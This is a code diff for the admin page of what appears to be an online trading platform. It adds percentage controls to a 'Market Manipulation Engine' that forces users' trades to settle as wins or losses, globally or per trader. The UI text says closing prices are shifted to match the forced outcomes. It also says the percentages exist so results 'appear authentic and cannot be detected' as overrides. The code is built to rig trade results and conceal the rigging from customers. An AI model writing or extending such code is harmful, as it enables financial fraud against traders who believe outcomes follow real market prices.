@@ -50,6 +50,7 @@ interface AdminUser {
   demoBalance: number;
   createdAt: string;
   manipulation: string;
+  winRate?: number | null;
 }
 
 interface AdminDeposit {
@@ -98,6 +99,12 @@ export default function AdminPage() {
   
   // State
   const [manipulation, setManipulation] = useState<string>("normal");
+  const [forceWinRate, setForceWinRate] = useState<number>(85);
+  const [forceLossRate, setForceLossRate] = useState<number>(85);
+  const [inputForceWinRate, setInputForceWinRate] = useState<string>("85");
+  const [inputForceLossRate, setInputForceLossRate] = useState<string>("85");
+  const [savingRate, setSavingRate] = useState<"force_win" | "force_loss" | null>(null);
+  const [rateSuccess, setRateSuccess] = useState<string | null>(null);
   const [activeTrades, setActiveTrades] = useState<AdminTrade[]>([]);
   const [users, setUsers] = useState<AdminUser[]>([]);
   const [, setLoadingSettings] = useState(true);
@@ -133,6 +140,7 @@ export default function AdminPage() {
   const [editingUser, setEditingUser] = useState<AdminUser | null>(null);
   const [newBalance, setNewBalance] = useState("");
   const [newDemoBalance, setNewDemoBalance] = useState("");
+  const [newUserWinRate, setNewUserWinRate] = useState("");
   const [userActionError, setUserActionError] = useState("");
   const [userActionSuccess, setUserActionSuccess] = useState(false);
   const [submittingUserEdit, setSubmittingUserEdit] = useState(false);
@@ -170,6 +178,12 @@ export default function AdminPage() {
       if (res.ok) {
         const data = await res.json();
         setManipulation(data.manipulation);
+        const winR = data.forceWinRate ?? 85.0;
+        const lossR = data.forceLossRate ?? 85.0;
+        setForceWinRate(winR);
+        setForceLossRate(lossR);
+        setInputForceWinRate(winR.toString());
+        setInputForceLossRate(lossR.toString());
         setMinDeposit(data.minDeposit ?? 5.0);
         setMinWithdrawal(data.minWithdrawal ?? 100.0);
         setMinStake(data.minStake ?? 5.0);
@@ -281,7 +295,11 @@ export default function AdminPage() {
       const res = await fetch("/api/admin/settings", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ manipulation: mode }),
+        body: JSON.stringify({
+          manipulation: mode,
+          ...(mode === "force_win" ? { forceWinRate } : {}),
+          ...(mode === "force_loss" ? { forceLossRate } : {}),
+        }),
       });
       if (res.ok) {
         const data = await res.json();
@@ -292,6 +310,27 @@ export default function AdminPage() {
       console.error(e);
     } finally {
       setUpdatingMode(null);
+    }
+  };
+
+  const saveRate = async (type: "force_win" | "force_loss", val: number) => {
+    setSavingRate(type);
+    try {
+      const res = await fetch("/api/admin/settings", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(
+          type === "force_win" ? { forceWinRate: val } : { forceLossRate: val }
+        ),
+      });
+      if (res.ok) {
+        setRateSuccess(type);
+        setTimeout(() => setRateSuccess(null), 2500);
+      }
+    } catch (e) {
+      console.error("Failed to save manipulation rate:", e);
+    } finally {
+      setSavingRate(null);
     }
   };
 
@@ -394,6 +433,7 @@ export default function AdminPage() {
           userId: editingUser.id,
           balance: newBalance !== "" ? parseFloat(newBalance) : undefined,
           demoBalance: newDemoBalance !== "" ? parseFloat(newDemoBalance) : undefined,
+          winRate: newUserWinRate !== "" ? parseFloat(newUserWinRate) : null,
         }),
       });
 
@@ -408,6 +448,7 @@ export default function AdminPage() {
         setEditingUser(null);
         setNewBalance("");
         setNewDemoBalance("");
+        setNewUserWinRate("");
         setUserActionSuccess(false);
       }, 1000);
     } catch (e: unknown) {
@@ -532,8 +573,8 @@ export default function AdminPage() {
                 manipulation === "force_win" ? "text-emerald-400" :
                 manipulation === "force_loss" ? "text-rose-400" : "text-gray-300"
               }`}>
-                {manipulation === "normal" ? "Normal Mode" :
-                 manipulation === "force_win" ? "Force Win" : "Force Loss"}
+                {manipulation === "normal" ? "Normal (Organic)" :
+                 manipulation === "force_win" ? `Force Win (${forceWinRate}%)` : `Force Loss (${forceLossRate}%)`}
               </span>
             </div>
           </div>
@@ -578,89 +619,329 @@ export default function AdminPage() {
 
         {/* MARKET MANIPULATION SELECTOR */}
         <section className="bg-[#0d0f17] border border-white/[0.07] rounded-3xl p-5 sm:p-6 space-y-4">
-          <div className="flex items-center gap-2">
-            <Sparkles className="w-4 h-4 text-purple-400" />
-            <h2 className="text-sm font-bold uppercase tracking-wider text-white">Market Manipulation Engine</h2>
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-2">
+              <Sparkles className="w-4 h-4 text-purple-400" />
+              <h2 className="text-sm font-bold uppercase tracking-wider text-white">Market Manipulation Engine</h2>
+            </div>
+            <span className="text-[11px] text-gray-400">
+              Active Strategy:{" "}
+              <span className={`font-bold ${
+                manipulation === "force_win" ? "text-emerald-400" :
+                manipulation === "force_loss" ? "text-rose-400" : "text-blue-400"
+              }`}>
+                {manipulation === "normal" ? "Normal (Natural)" :
+                 manipulation === "force_win" ? `Force Win @ ${forceWinRate}%` :
+                 `Force Loss @ ${forceLossRate}%`}
+              </span>
+            </span>
           </div>
-          <p className="text-xs text-gray-400 leading-relaxed max-w-2xl">
-            Inject a custom settlement override for all upcoming trade expirations. Forced modes guarantee that users win or lose, dynamically shifting closing prices to maintain mathematical alignment.
+          <p className="text-xs text-gray-400 leading-relaxed max-w-3xl">
+            Inject a custom probability override for trade expirations. Setting a percentage ensures that wins or losses are statistically distributed (e.g. 85% forced, 15% natural) so charts and outcomes appear authentic and cannot be detected as static 100% overrides.
           </p>
 
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2">
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 pt-2">
             {/* NORMAL MODE CARD */}
-            <button
-              onClick={() => updateManipulationMode("normal")}
-              disabled={updatingMode !== null}
-              className={`p-4 rounded-2xl border text-left transition flex flex-col justify-between h-28 relative ${
+            <div
+              className={`p-5 rounded-2xl border transition flex flex-col justify-between relative ${
                 manipulation === "normal"
-                  ? "bg-white/[0.03] border-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.15)]"
-                  : "bg-white/[0.01] border-white/[0.05] hover:border-white/10 hover:bg-white/[0.02]"
+                  ? "bg-blue-500/[0.04] border-blue-500 shadow-[0_0_20px_rgba(59,130,246,0.15)]"
+                  : "bg-white/[0.01] border-white/[0.06] hover:border-white/10 hover:bg-white/[0.02]"
               }`}
             >
-              <div className="flex items-center justify-between w-full">
-                <div className="w-7 h-7 rounded-lg bg-gray-500/10 border border-gray-500/20 flex items-center justify-center">
-                  <RotateCcw className="w-3.5 h-3.5 text-gray-400" />
+              <div className="flex items-center justify-between w-full mb-3">
+                <div className="flex items-center gap-2.5">
+                  <div className="w-8 h-8 rounded-lg bg-gray-500/10 border border-gray-500/20 flex items-center justify-center">
+                    <RotateCcw className="w-4 h-4 text-gray-400" />
+                  </div>
+                  <div>
+                    <span className="text-xs font-bold text-white block">Natural Resolution</span>
+                    <span className="text-[10px] text-gray-500 block">Pure market ticks</span>
+                  </div>
                 </div>
-                {updatingMode === "normal" && <Loader2 className="w-4 h-4 text-gray-400 animate-spin" />}
-                {manipulation === "normal" && !updatingMode && (
-                  <span className="px-2 py-0.5 rounded-full bg-blue-500/15 border border-blue-500/30 text-[9px] font-bold text-blue-400 uppercase tracking-widest">Active</span>
+                {manipulation === "normal" ? (
+                  <span className="px-2.5 py-1 rounded-full bg-blue-500/15 border border-blue-500/30 text-[9px] font-bold text-blue-400 uppercase tracking-widest">Active</span>
+                ) : (
+                  <button
+                    onClick={() => updateManipulationMode("normal")}
+                    disabled={updatingMode !== null}
+                    className="px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 text-white font-bold text-[10px] transition"
+                  >
+                    Activate
+                  </button>
                 )}
               </div>
-              <div>
-                <span className="text-xs font-bold text-white block mb-0.5">Natural Resolution</span>
-                <span className="text-[10px] text-gray-500 leading-tight block">Trades resolve organically based on standard live price ticks.</span>
+              <p className="text-[11px] text-gray-400 leading-relaxed">
+                Trades settle completely organically based on real-time price ticks without any price bias or intervention.
+              </p>
+              <div className="mt-4 pt-3 border-t border-white/[0.04] text-[10px] text-gray-500 flex items-center gap-1.5">
+                <span className="w-1.5 h-1.5 rounded-full bg-blue-400" />
+                Fair odds distribution (50/50)
               </div>
-            </button>
+            </div>
 
             {/* FORCE WIN CARD */}
-            <button
-              onClick={() => updateManipulationMode("force_win")}
-              disabled={updatingMode !== null}
-              className={`p-4 rounded-2xl border text-left transition flex flex-col justify-between h-28 relative ${
+            <div
+              className={`p-5 rounded-2xl border transition flex flex-col justify-between relative ${
                 manipulation === "force_win"
-                  ? "bg-emerald-500/5 border-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.15)]"
-                  : "bg-white/[0.01] border-white/[0.05] hover:border-white/10 hover:bg-white/[0.02]"
+                  ? "bg-emerald-500/[0.04] border-emerald-500 shadow-[0_0_20px_rgba(16,185,129,0.15)]"
+                  : "bg-white/[0.01] border-white/[0.06] hover:border-white/10 hover:bg-white/[0.02]"
               }`}
             >
-              <div className="flex items-center justify-between w-full">
-                <div className="w-7 h-7 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
-                  <CheckCircle className="w-3.5 h-3.5 text-emerald-400" />
-                </div>
-                {updatingMode === "force_win" && <Loader2 className="w-4 h-4 text-emerald-400 animate-spin" />}
-                {manipulation === "force_win" && !updatingMode && (
-                  <span className="px-2 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-[9px] font-bold text-emerald-400 uppercase tracking-widest">Active</span>
-                )}
-              </div>
               <div>
-                <span className="text-xs font-bold text-white block mb-0.5">Force Win Mode</span>
-                <span className="text-[10px] text-gray-500 leading-tight block">All expirations settle as WIN, auto-adjusting close prices to match.</span>
+                <div className="flex items-center justify-between w-full mb-3">
+                  <div className="flex items-center gap-2.5">
+                    <div className="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
+                      <CheckCircle className="w-4 h-4 text-emerald-400" />
+                    </div>
+                    <div>
+                      <span className="text-xs font-bold text-white block">Force Win Mode</span>
+                      <span className="text-[10px] text-emerald-400/80 font-medium block">
+                        {forceWinRate}% Win Rate Probability
+                      </span>
+                    </div>
+                  </div>
+                  {manipulation === "force_win" ? (
+                    <span className="px-2.5 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-[9px] font-bold text-emerald-400 uppercase tracking-widest">Active</span>
+                  ) : (
+                    <button
+                      onClick={() => updateManipulationMode("force_win")}
+                      disabled={updatingMode !== null}
+                      className="px-2.5 py-1 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 border border-emerald-500/30 font-bold text-[10px] transition"
+                    >
+                      Activate
+                    </button>
+                  )}
+                </div>
+
+                {/* Percentage control slider & input */}
+                <div className="space-y-2.5 bg-black/20 rounded-xl p-3 border border-white/[0.05]">
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Win Percentage</span>
+                    <div className="flex items-center gap-1">
+                      <input
+                        type="number"
+                        min="1"
+                        max="100"
+                        value={inputForceWinRate}
+                        onChange={(e) => {
+                          setInputForceWinRate(e.target.value);
+                          const n = parseFloat(e.target.value);
+                          if (!isNaN(n) && n >= 1 && n <= 100) setForceWinRate(n);
+                        }}
+                        className="w-12 bg-[#13161e] border border-white/10 rounded px-1.5 py-0.5 text-right font-bold text-emerald-400 text-xs outline-none"
+                      />
+                      <span className="text-xs font-bold text-emerald-400">%</span>
+                    </div>
+                  </div>
+
+                  <input
+                    type="range"
+                    min="1"
+                    max="100"
+                    step="1"
+                    value={forceWinRate}
+                    onChange={(e) => {
+                      const val = Number(e.target.value);
+                      setForceWinRate(val);
+                      setInputForceWinRate(val.toString());
+                    }}
+                    className="w-full accent-emerald-500 h-1.5 bg-white/10 rounded-lg cursor-pointer"
+                  />
+
+                  {/* Quick Preset Pills */}
+                  <div className="flex gap-1">
+                    {[60, 75, 85, 90, 95, 100].map((rate) => (
+                      <button
+                        key={rate}
+                        type="button"
+                        onClick={() => {
+                          setForceWinRate(rate);
+                          setInputForceWinRate(rate.toString());
+                          saveRate("force_win", rate);
+                        }}
+                        className={`flex-1 py-0.5 text-[9px] font-bold rounded transition ${
+                          forceWinRate === rate
+                            ? "bg-emerald-500 text-white"
+                            : "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white"
+                        }`}
+                      >
+                        {rate}%
+                      </button>
+                    ))}
+                  </div>
+
+                  {/* Visual Probability Distribution Bar */}
+                  <div className="space-y-1 pt-1">
+                    <div className="w-full h-2 rounded-full overflow-hidden bg-white/10 flex">
+                      <div style={{ width: `${forceWinRate}%` }} className="bg-emerald-500 h-full" />
+                      <div style={{ width: `${100 - forceWinRate}%` }} className="bg-slate-700 h-full" />
+                    </div>
+                    <div className="flex justify-between text-[9px] text-gray-500 font-medium">
+                      <span className="text-emerald-400 font-bold">{forceWinRate}% Wins</span>
+                      <span>{(100 - forceWinRate).toFixed(0)}% Natural Losses</span>
+                    </div>
+                  </div>
+                </div>
               </div>
-            </button>
+
+              <div className="mt-3 flex items-center justify-between">
+                <span className="text-[10px] text-gray-400">
+                  {forceWinRate === 100 ? "100% Guaranteed Win" : `~${forceWinRate}% Wins, ~${(100 - forceWinRate).toFixed(0)}% Losses`}
+                </span>
+                <button
+                  onClick={() => saveRate("force_win", forceWinRate)}
+                  disabled={savingRate === "force_win"}
+                  className="px-2.5 py-1 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 text-[10px] font-bold transition flex items-center gap-1"
+                >
+                  {savingRate === "force_win" ? (
+                    <Loader2 className="w-3 h-3 animate-spin" />
+                  ) : rateSuccess === "force_win" ? (
+                    <>
+                      <Check className="w-3 h-3 text-emerald-400" />
+                      Saved
+                    </>
+                  ) : (
+                    <>
+                      <Save className="w-3 h-3" />
+                      Save Rate
+                    </>
+                  )}
+                </button>
+              </div>
+            </div>
 
             {/* FORCE LOSS CARD */}
-            <button
-              onClick={() => updateManipulationMode("force_loss")}
-              disabled={updatingMode !== null}
-              className={`p-4 rounded-2xl border text-left transition flex flex-col justify-between h-28 relative ${
+            <div
+              className={`p-5 rounded-2xl border transition flex flex-col justify-between relative ${
                 manipulation === "force_loss"
-                  ? "bg-rose-500/5 border-rose-500 shadow-[0_0_15px_rgba(244,63,94,0.15)]"
-                  : "bg-white/[0.01] border-white/[0.05] hover:border-white/10 hover:bg-white/[0.02]"
+                  ? "bg-rose-500/[0.04] border-rose-500 shadow-[0_0_20px_rgba(244,63,94,0.15)]"
+                  : "bg-white/[0.01] border-white/[0.06] hover:border-white/10 hover:bg-white/[0.02]"
               }`}
             >
-              <div className="flex items-center justify-between w-full">
-                <div className="w-7 h-7 rounded-lg bg-rose-500/10 border border-rose-500/20 flex items-center justify-center">
-                  <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
-                </div>
-                {updatingMode === "force_loss" && <Loader2 className="w-4 h-4 text-rose-400 animate-spin" />}
-                {manipulation === "force_loss" && !updatingMode && (
-                  <span className="px-2 py-0.5 rounded-full bg-rose-500/15 border border-rose-500/30 text-[9px] font-bold text-rose-400 uppercase tracking-widest">Active</span>
-                )}
-              </div>
               <div>
-                <span className="text-xs font-bold text-white block mb-0.5">Force Loss Mode</span>
-                <span className="text-[10px] text-gray-500 leading-tight block">All expirations settle as LOSS, auto-adjusting close prices to match.</span>
+                <div className="flex items-center justify-between w-full mb-3">
+                  <div className="flex items-center gap-2.5">
+                    <div className="w-8 h-8 rounded-lg bg-rose-500/10 border border-rose-500/20 flex items-center justify-center">
+                      <AlertTriangle className="w-4 h-4 text-rose-400" />
+                    </div>
+                    <div>
+                      <span className="text-xs font-bold text-white block">Force Loss Mode</span>
+                      <span className="text-[10px] text-rose-400/80 font-medium block">
+                        {forceLossRate}% Loss Rate Probability
+                      </span>
+                    </div>
+                  </div>
+                  {manipulation === "force_loss" ? (
+                    <span className="px-2.5 py-1 rounded-full bg-rose-500/15 border border-rose-500/30 text-[9px] font-bold text-rose-400 uppercase tracking-widest">Active</span>
+                  ) : (
+                    <button
+                      onClick={() => updateManipulationMode("force_loss")}
+                      disabled={updatingMode !== null}
+                      className="px-2.5 py-1 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-400 border border-rose-500/30 font-bold text-[10px] transition"
+                    >
+                      Activate
+                    </button>
+                  )}
+                </div>
+
+                {/* Percentage control slider & input */}
+                <div className="space-y-2.5 bg-black/20 rounded-xl p-3 border border-white/[0.05]">
+                  <div className="flex items-center justify-between text-xs">
+                    <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Loss Percentage</span>
+                    <div className="flex items-center gap-1">
+                      <input
+                        type="number"
+                        min="1"
+                        max="100"
+                        value={inputForceLossRate}
+                        onChange={(e) => {
+                          setInputForceLossRate(e.target.value);
+                          const n = parseFloat(e.target.value);
+                          if (!isNaN(n) && n >= 1 && n <= 100) setForceLossRate(n);
+                        }}
+                        className="w-12 bg-[#13161e] border border-white/10 rounded px-1.5 py-0.5 text-right font-bold text-rose-400 text-xs outline-none"
+                      />
+                      <span className="text-xs font-bold text-rose-400">%</span>
+                    </div>
+                  </div>
+
+                  <input
+                    type="range"
+                    min="1"
+                    max="100"
+                    step="1"
+                    value={forceLossRate}
+                    onChange={(e) => {
+                      const val = Number(e.target.value);
+                      setForceLossRate(val);
+                      setInputForceLossRate(val.toString());
+                    }}
+                    className="w-full accent-rose-500 h-1.5 bg-white/10 rounded-lg cursor-pointer"
+                  />
+
+                  {/* Quick Preset Pills */}
+                  <div className="flex gap-1">
+                    {[60, 75, 85, 90, 95, 100].map((rate) => (
+                      <button
+                        key={rate}
+                        type="button"
+                        onClick={() => {
+                          setForceLossRate(rate);
+                          setInputForceLossRate(rate.toString());
+                          saveRate("force_loss", rate);
+                        }}
+                        className={`flex-1 py-0.5 text-[9px] font-bold rounded transition ${
+                          forceLossRate === rate
+                            ? "bg-rose-500 text-white"
+                            : "bg-white/5 text-gray-400 hover:bg-white/10 hover:text-white"
+                        }`}
+                      >
+                        {rate}%
+                      </button>
+                    ))}
+                  </div>
+
+                  {/* Visual Probability Distribution Bar */}
+                  <div className="space-y-1 pt-1">
+                    <div className="w-full h-2 rounded-full overflow-hidden bg-white/10 flex">
+                      <div style={{ width: `${forceLossRate}%` }} className="bg-rose-500 h-full" />
+                      <div style={{ width: `${100 - forceLossRate}%` }} className="bg-slate-700 h-full" />
+                    </div>
+                    <div className="flex justify-between text-[9px] text-gray-500 font-medium">
+                      <span className="text-rose-400 font-bold">{forceLossRate}% Losses</span>
+                      <span>{(100 - forceLossRate).toFixed(0)}% Natural Wins</span>
+                    </div>
+                  </div>
+                </div>
               </div>
-            </button>
+
+              <div className="mt-3 flex items-center justify-between">
+                <span className="text-[10px] text-gray-400">
+                  {forceLossRate === 100 ? "100% Guaranteed Loss" : `~${forceLossRate}% Losses, ~${(100 - forceLossRate).toFixed(0)}% Wins`}
+                </span>
+                <button
+                  onClick={() => saveRate("force_loss", forceLossRate)}
+                  disabled={savingRate === "force_loss"}
+                  className="px-2.5 py-1 rounded-lg bg-rose-500/20 hover:bg-rose-500/30 text-rose-400 text-[10px] font-bold transition flex items-center gap-1"
+                >
+                  {savingRate === "force_loss" ? (
+                    <Loader2 className="w-3 h-3 animate-spin" />
+                  ) : rateSuccess === "force_loss" ? (
+                    <>
+                      <Check className="w-3 h-3 text-rose-400" />
+                      Saved
+                    </>
+                  ) : (
+                    <>
+                      <Save className="w-3 h-3" />
+                      Save Rate
+                    </>
+                  )}
+                </button>
+              </div>
+            </div>
+
           </div>
         </section>
 
@@ -1390,7 +1671,7 @@ export default function AdminPage() {
                                       : "bg-white/5 text-gray-500 border border-transparent hover:bg-white/10"
                                   }`}
                                 >
-                                  Win
+                                  {u.manipulation === "force_win" ? `Win (${u.winRate ?? forceWinRate}%)` : "Win"}
                                 </button>
                                 <button
                                   onClick={() => updateUserManipulation(u.id, "force_loss")}
@@ -1400,7 +1681,7 @@ export default function AdminPage() {
                                       : "bg-white/5 text-gray-500 border border-transparent hover:bg-white/10"
                                   }`}
                                 >
-                                  Loss
+                                  {u.manipulation === "force_loss" ? `Loss (${u.winRate ?? forceLossRate}%)` : "Loss"}
                                 </button>
                               </div>
                             </td>
@@ -1413,12 +1694,13 @@ export default function AdminPage() {
                                   setEditingUser(u);
                                   setNewBalance(u.balance.toString());
                                   setNewDemoBalance(u.demoBalance.toString());
+                                  setNewUserWinRate(u.winRate !== undefined && u.winRate !== null ? u.winRate.toString() : "");
                                   setUserActionError("");
                                   setUserActionSuccess(false);
                                 }}
                                 className="px-2.5 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white font-bold text-[10px] transition"
                               >
-                                Adjust Balance
+                                Edit Account
                               </button>
                             </td>
                           </tr>
@@ -1539,6 +1821,31 @@ export default function AdminPage() {
                     className="w-full bg-[#141822] border border-white/[0.08] rounded-xl pl-7 pr-3 py-2 text-sm text-white outline-none focus:border-blue-500/50"
                   />
                 </div>
+              </div>
+
+              <div>
+                <div className="flex items-center justify-between mb-1.5">
+                  <label className="text-[10px] text-gray-500 font-bold uppercase tracking-wider block">
+                    Custom Win / Loss Rate (%)
+                  </label>
+                  <span className="text-[9px] text-gray-500 font-medium">Optional Override</span>
+                </div>
+                <div className="relative">
+                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">%</span>
+                  <input
+                    type="number"
+                    min="1"
+                    max="100"
+                    step="1"
+                    value={newUserWinRate}
+                    onChange={(e) => setNewUserWinRate(e.target.value)}
+                    placeholder={`Global default (${editingUser.manipulation === "force_loss" ? forceLossRate : forceWinRate}%)`}
+                    className="w-full bg-[#141822] border border-white/[0.08] rounded-xl pl-7 pr-3 py-2 text-sm text-white outline-none focus:border-blue-500/50"
+                  />
+                </div>
+                <p className="text-[10px] text-gray-500 mt-1">
+                  Leave empty to inherit the global platform rate. Set 1-100 to override specifically for this trader.
+                </p>
               </div>
 
               {userActionError && (
